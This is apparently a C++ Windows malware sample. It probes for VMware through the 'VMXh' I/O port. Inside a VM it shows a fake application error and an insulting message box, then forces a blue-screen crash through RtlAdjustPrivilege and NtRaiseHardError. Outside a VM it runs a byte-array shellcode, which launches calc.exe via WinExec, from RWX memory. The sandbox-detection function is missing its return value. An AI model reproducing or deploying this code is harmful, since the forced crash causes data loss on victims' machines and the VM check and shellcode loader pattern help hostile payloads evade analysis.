#include <windows.h>
#include <iostream>
#include <string>
#include <cstring>
#include <winternl.h>

typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

using namespace std;

bool isInsideVMWare()
{
    bool rc = true;

    __try
    {
        __asm
        {
            push edx
            push ecx
            push ebx

            mov eax, 'VMXh'
            mov ebx, 0
            mov ecx, 10
            mov edx, 'VX'

            in     eax, dx
            cmp    ebx, 'VMXh'
            setz[rc]

            pop ebx
            pop ecx
            pop edx
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        rc = false;
    }
}
void Payload(const wstring& programName)
{
    wstring pwned = L"The application was unable to start correctly (0xc000007b). Click OK to close the application.";
    wstring title_name = programName + L" - Application Error";

    MessageBoxW(NULL, pwned.c_str(), title_name.c_str(), MB_OK | MB_ICONSTOP);

    //let me sleep for a minute.
    Sleep(30000);

    //I'm a judge's disemboweler. A magistrate desrtoyer.
    MessageBoxW(NULL, L"YOU THINK YOU ARE  GOD , \n BUT YOU ARE ONLY A CHUNK OF SHIT", L"Another haughty bloodsucker.......", MB_OK | MB_ICONSTOP);
    
    //blue screen envoking
    BOOLEAN bEnabled;
    ULONG uResp;
    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError"); //You need to add L before "ntdll.dll" to make it work because it's a LPCSTR.
    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
}

wstring GetProgramName()
{
    wchar_t buffer[MAX_PATH];
    GetModuleFileNameW(NULL, buffer, MAX_PATH);
    wstring fullPath = buffer;

    size_t lastSlash = fullPath.find_last_of(L"\\/");
    if (lastSlash != wstring::npos)
    {
        return fullPath.substr(lastSlash + 1);
    }
    return fullPath;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    if (isInsideVMWare())
    {
        wstring programName = GetProgramName();
        Payload(programName);
        return 0;
    }
    else
    {
        unsigned char shellcode[] = {
            "\x50\x53\x51\x52\x56\x57\x55\x89"
            "\xe5\x83\xec\x18\x31\xf6\x56\x6a"
            "\x63\x66\x68\x78\x65\x68\x57\x69"
            "\x6e\x45\x89\x65\xfc\x31\xf6\x64"
            "\x8b\x5e\x30\x8b\x5b\x0c\x8b\x5b"
            "\x14\x8b\x1b\x8b\x1b\x8b\x5b\x10"
            "\x89\x5d\xf8\x31\xc0\x8b\x43\x3c"
            "\x01\xd8\x8b\x40\x78\x01\xd8\x8b"
            "\x48\x24\x01\xd9\x89\x4d\xf4\x8b"
            "\x78\x20\x01\xdf\x89\x7d\xf0\x8b"
            "\x50\x1c\x01\xda\x89\x55\xec\x8b"
            "\x58\x14\x31\xc0\x8b\x55\xf8\x8b"
            "\x7d\xf0\x8b\x75\xfc\x31\xc9\xfc"
            "\x8b\x3c\x87\x01\xd7\x66\x83\xc1"
            "\x08\xf3\xa6\x74\x0a\x40\x39\xd8"
            "\x72\xe5\x83\xc4\x26\xeb\x41\x8b"
            "\x4d\xf4\x89\xd3\x8b\x55\xec\x66"
            "\x8b\x04\x41\x8b\x04\x82\x01\xd8"
            "\x31\xd2\x52\x68\x2e\x65\x78\x65"
            "\x68\x63\x61\x6c\x63\x68\x6d\x33"
            "\x32\x5c\x68\x79\x73\x74\x65\x68"
            "\x77\x73\x5c\x53\x68\x69\x6e\x64"
            "\x6f\x68\x43\x3a\x5c\x57\x89\xe6"
            "\x6a\x0a\x56\xff\xd0\x83\xc4\x46"
            "\x5d\x5f\x5e\x5a\x59\x5b\x58\xc3" };

        void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (exec != nullptr)
        {
            memcpy(exec, shellcode, sizeof(shellcode));

            ((void(*)())exec)();
        }
        return 0;
    }
}
